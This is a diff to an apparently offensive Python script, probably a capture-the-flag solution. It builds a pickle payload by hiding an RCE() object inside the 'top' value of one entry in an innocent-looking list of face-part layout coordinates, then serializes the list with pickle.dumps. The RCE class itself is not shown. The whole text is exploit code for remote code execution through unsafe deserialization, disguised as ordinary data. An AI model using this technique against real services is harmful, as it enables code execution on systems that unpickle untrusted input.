@@ -40,8 +40,29 @@ def payload():
     
     print('payload layout:\n')
     
-
-    my_layout=RCE()
+    _rce=RCE()
+    my_layout=[
+    {'id': 'eye01', 'left': 442, 'top': 275},
+    {'id': 'eye02', 'left': 4, 'top': 195},
+    {'id': 'eye03', 'left': 8, 'top': 487},
+    {'id': 'eye04', 'left': 19, 'top': 764},
+    {'id': 'eye05', 'left': 826, 'top': 18},
+    {'id': 'eye06', 'left': 853, 'top': 313},
+    {'id': 'eye07', 'left': 857, 'top': 524},
+    {'id': 'eye08', 'left': 889, 'top': 787},
+    {'id': 'lip01', 'left': 536, 'top': 450},
+    {'id': 'lip02', 'left': 112, 'top': 361},
+    {'id': 'lip03', 'left': 99, 'top': 660},
+    {'id': 'lip04', 'left': 113, 'top': 840},
+    {'id': 'lip05', 'left': 915, 'top': 212},
+    {'id': 'lip06', 'left': 861, 'top': 436},
+    {'id': 'lip07', 'left': 876, 'top': 687},
+    {'id': 'hair01', 'left': 1122, 'top': 22},
+    {'id': 'hair02', 'left': 1270, 'top': 30},
+    {'id': 'hair03', 'left': 1162, 'top': 148},
+    {'id': 'hair04', 'left': 1128, 'top': 296},
+    {'id': 'hako01', 'left': 1131, 'top': _rce},
+]
 
     print("typeof my_layout:",type(my_layout))
     my_layout=pickle.dumps(my_layout)
